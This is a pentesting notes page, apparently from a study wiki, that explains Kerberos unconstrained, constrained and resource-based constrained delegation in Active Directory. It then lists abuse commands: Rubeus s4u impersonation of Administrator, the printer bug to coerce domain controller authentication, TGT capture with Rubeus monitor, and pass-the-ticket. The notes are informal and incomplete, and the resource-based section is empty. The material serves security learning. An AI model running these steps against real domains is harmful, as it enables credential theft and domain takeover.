# Delegations

## Theory

Kerberos delegation allow to "reuse the end-user credentials to access resources osted on a different server"\


<figure><img src="../../../../.gitbook/assets/Pasted image 20230911095916 (1).png" alt=""><figcaption></figcaption></figure>

Delegation allows the web server to impersonate the user to access its files, making the file server believe that the user is performing the actions. The ability to relay credentials can be given to an account that has at least one SPN. The types of delegation today are three:

* Uncostrained Delegation
* Constrained Delegation
* Resource Based Constrained Delegation

## **Uncostrained Delegation**

With this type of delegation, the server or service account to which delegation is granted can impersonate the user for any service or host.

<figure><img src="../../../../.gitbook/assets/Pasted image 20230911103746 (1).png" alt=""><figcaption></figcaption></figure>

## **Constrained Delegation**

The delegate will have a list of users for whom they have delegation and a list of services or servers they can access with specific delegations.

<figure><img src="../../../../.gitbook/assets/Pasted image 20230911103801.png" alt=""><figcaption></figcaption></figure>

## **Resource Based Constrained Delegation**

Like the constrained delegation, but this tike the delegation authority is the resource host itself.

<figure><img src="../../../../.gitbook/assets/Pasted image 20230911103731.png" alt=""><figcaption></figcaption></figure>

## Abuse

### Constrained Delegation

With the account with the permission's hash launch rubeus to ask a tgt as administrator

{% code overflow="wrap" %}
```powershell
./Rubeus.exe s4u /user:<USER> /aes256:<AES256 HASH> /impersonateuser:Administrator /msdsspn:"<FOUND SERVICE>" /ptt
```
{% endcode %}

### Unconstrained Delegation

First, we need to find out the machines in the domain with unconstrained delegation. We can use PowerView for that. I used BloodHound.

```
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Connect to the machine with unconstrained delegation and use rubeus to monitor

```
Rubeus.exe monitor /targetuser:US-DC$ /interval:5  /nowrap
```

And now abuse the printer bug to receive a tgt

```
MS-RPRN.exe \\<$Dc> \\<$Target>
```

Now pass the [ticket](../../lateral-movement/pass-the/pass-the-ticket.md)

### Resource Based Constrained Delegation



### Monitor for Delegation

idk if it's really a delegation&#x20;

Launch rubeus

```powershell
./Rubeus.exe monitor /targetuser:<TARGET MACHINE>$ /interval:5 /nowrap
```

&#x20;Now use MS-RPRN to force authentication from dcorp-dc$(Machine account)

```powershell
./MS-RPRN.exe \\<TARGET MACHINE> \\<LISTENER MACHINE>
```

Rubeus is triggered

Copy the ticket and use it with rubeus on the local machine

```powershell
./Rubeus.exe ptt /ticket:<TICKET>
```
